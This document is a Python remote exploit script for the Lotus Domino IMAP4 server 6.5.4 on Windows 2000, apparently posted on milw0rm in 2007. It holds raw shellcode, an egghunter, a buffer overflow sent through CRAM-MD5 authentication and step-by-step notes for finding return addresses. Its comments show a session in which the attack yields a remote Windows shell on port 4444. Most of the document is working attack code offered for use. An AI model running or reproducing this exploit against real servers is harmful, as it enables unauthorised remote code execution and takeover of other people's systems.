###########################################################################################
# Lotus Domino IMAP4 Server Release 6.5.4 / Windows 2000 Advanced Server x86 Remote Exploit
###########################################################################################
# Vulnerable: IBM Lotus Domino <= 7.0.2 && 6.5.5 FP2 (tested 6.5.4)
# Authors: Dominic Chell <dmc@digitalapocalypse.net> & prdelka
#
# Exploitation steps:
# 1) The instruction "call dword [ecx]" is performed with user supplied ECX
# 2) EAX reference our buffer from retaddr onward
# 3) we put pointer in ECX to a pointer referencing "call eax"
# 4) a small payload decrements eax and then jmp's into the eax buffer due
#    to size limitations.
# 5) our larger payload is then executed.
#
# muts exploit would not work for us, his egghunt uses 0x2e which is converted
# to 0x09 (.'s to [tab]'s) and his return address was not found on our test
# environment.
#
# Finding a Target:
# To find a target, attach a debugger to nimap.exe, cause the application
# to crash. Then use search function to find "call eax" or equivilant
# instruction in memory. Then, take the pointer to eax, such as "0x77ff1122"
# and search for another location in memory that has "0x11 0xff 0x77". This
# will be utilised for a return address if no instruction modify eax or
# subvert execution to another place in memory.
#
# Thanks to: nemo, hdm, jf, Winny Thomas, muts
#
###########################################################################################
# Note: it takes a few minutes for the egghunter to find the payload in memory
#
# For example:
# C:\work\exploits\imap>poc.py
# [*] sending payload
# [*] sending payload
# [*] sending payload
# [*] sending payload
# * OK Domino IMAP4 Server Release 6.5.4 ready Tue, 26 Jun 2007 15:18:36 +0100
#
# PDAwNEU5QkNCLjgwMjU3MzA2LjAwMDAwOUY4LjAwMDAwMDA5QERNQz4=
#
# sending...
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQ
# kJCQkJCQkJCQkJCQkJCQkJCQkJCQkNvS2XQk9FgpybEKu3E1If4xWBcDWBeDmcnDC2rgYnVG+2Q3
# BG5572VAQQov6VasmyGZmqi4dlFEk/x9Zwv0gcDrZXeQkJCD6FKD6FKD6FL/4CB4OcnLXAvHq421
# M2iR5FFG
#
#
# C:\work\exploits\imap>nc -vv 192.168.126.130 4444
# 2KVM-DC [192.168.126.130] 4444 (?) open
# Microsoft Windows 2000 [Version 5.00.2195]
# (C) Copyright 1985-1999 Microsoft Corp.
#
# E:\Lotus\Domino>
#
###########################################################################################

import socket, struct, md5, base64, sys, string, signal, getopt


class Exp_Lotus:
       def __init__(self):
               self.host='127.0.0.1'
               self.port=143


def send_payload(host,port):
       payload ="\x54\x30\x30\x57\x54\x30\x30\x57"
       payload += ("\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7"
       "\x82\xf8\x80\x83\xeb\xfc\xe2\xf4\x0b\xe8\x13\xcd\x1f\x7b\x07\x7f"
       "\x08\xe2\x73\xec\xd3\xa6\x73\xc5\xcb\x09\x84\x85\x8f\x83\x17\x0b"
       "\xb8\x9a\x73\xdf\xd7\x83\x13\xc9\x7c\xb6\x73\x81\x19\xb3\x38\x19"
       "\x5b\x06\x38\xf4\xf0\x43\x32\x8d\xf6\x40\x13\x74\xcc\xd6\xdc\xa8"
       "\x82\x67\x73\xdf\xd3\x83\x13\xe6\x7c\x8e\xb3\x0b\xa8\x9e\xf9\x6b"
       "\xf4\xae\x73\x09\x9b\xa6\xe4\xe1\x34\xb3\x23\xe4\x7c\xc1\xc8\x0b"
       "\xb7\x8e\x73\xf0\xeb\x2f\x73\xc0\xff\xdc\x90\x0e\xb9\x8c\x14\xd0"
       "\x08\x54\x9e\xd3\x91\xea\xcb\xb2\x9f\xf5\x8b\xb2\xa8\xd6\x07\x50"
       "\x9f\x49\x15\x7c\xcc\xd2\x07\x56\xa8\x0b\x1d\xe6\x76\x6f\xf0\x82"
       "\xa2\xe8\xfa\x7f\x27\xea\x21\x89\x02\x2f\xaf\x7f\x21\xd1\xab\xd3"
       "\xa4\xd1\xbb\xd3\xb4\xd1\x07\x50\x91\xea\xe9\xdc\x91\xd1\x71\x61"
       "\x62\xea\x5c\x9a\x87\x45\xaf\x7f\x21\xe8\xe8\xd1\xa2\x7d\x28\xe8"
       "\x53\x2f\xd6\x69\xa0\x7d\x2e\xd3\xa2\x7d\x28\xe8\x12\xcb\x7e\xc9"
       "\xa0\x7d\x2e\xd0\xa3\xd6\xad\x7f\x27\x11\x90\x67\x8e\x44\x81\xd7"
       "\x08\x54\xad\x7f\x27\xe4\x92\xe4\x91\xea\x9b\xed\x7e\x67\x92\xd0"
       "\xae\xab\x34\x09\x10\xe8\xbc\x09\x15\xb3\x38\x73\x5d\x7c\xba\xad"
       "\x09\xc0\xd4\x13\x7a\xf8\xc0\x2b\x5c\x29\x90\xf2\x09\x31\xee\x7f"
       "\x82\xc6\x07\x56\xac\xd5\xaa\xd1\xa6\xd3\x92\x81\xa6\xd3\xad\xd1"
       "\x08\x52\x90\x2d\x2e\x87\x36\xd3\x08\x54\x92\x7f\x08\xb5\x07\x50"
       "\x7c\xd5\x04\x03\x33\xe6\x07\x56\xa5\x7d\x28\xe8\x07\x08\xfc\xdf"
       "\xa4\x7d\x2e\x7f\x27\x82\xf8\x80")

       try:
               s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               connect=s.connect((host,port))
               d=s.recv(1024)
               print "[*] sending payload"
               s.send('a001 admin ' + payload + '\r\n')
               d=s.recv(1024)
               s.close()
       except:
               "Can't connect to IMAP server"

def usage():
       print sys.argv[0] + "\n\n\tLotus Domino 6.5.4 Windows 2000 Advanced Server x86 Exploit\n\tauthor: dmc@digitalapocalypse.net & prdelka"
       print "\t-h host"
       print "\t-p port"
       sys.exit(2)

def signal_handler(signal, frame):
       print 'err: caught sigint, exiting'
       sys.exit(0)

def exp(host, port):
       buffer = "\x90" * 193
       buffer += ("\xdb\xd2\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x0a\xbb\x71\x35\x21"
       "\xfe\x31\x58\x17\x03\x58\x17\x83\x99\xc9\xc3\x0b\x6a\xe0\x62"
       "\x75\x46\xfb\x64\x37\x04\x6e\x79\xef\x65\x40\x41\x0a\x2f\xe9"
       "\x56\xac\x9b\x21\x99\x9a\xa8\xb8\x76\x51\x44\x93\xfc\x7d\x67"
       "\x0b\xf4\x81")

       try:
               s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               connect=s.connect((host,port))
               d=s.recv(1024)
               print d
               s.send('a001 authenticate cram-md5\r\n')
               d=s.recv(1024)
               d=d[2:1022].strip()
               print d
               m=md5.new()
               m.update(d)
               digest = m.digest()
               buffer += struct.pack('<L',  0x7765ebc0) # call eax 6014DC6E (ptr to 6014DC68)
               buffer += "\x90\x90\x90\x83\xE8\x52\x83\xE8\x52\x83\xE8\x52\xFF\xE0"
               buffer = buffer + ' ' + digest
               s.send(base64.encodestring(buffer) + '\r\n')
               print "\nsending...\n", base64.encodestring(buffer) , '\r\n'
       except:
               "Can't connect to IMAP server"

def main(argv=None):

       if argv is None:
               argv = sys.argv[1:]
       if not argv:
               usage()

       try:
               opts, args = getopt.getopt(argv, 'h:p:')
       except getopt.GetoptError:
               usage()

       signal.signal(signal.SIGINT, signal_handler)

       ex = Exp_Lotus()

       for o, a in opts:
               if o == '-h': ex.host=a.strip()
               elif o =='-p': ex.port = int(a)

       host = ex.host
       port = ex.port

       send_payload(host,port)
       send_payload(host,port)
       send_payload(host,port)
       send_payload(host,port)
       exp(host, port)

if __name__ == '__main__':
       main()

# milw0rm.com [2007-07-20]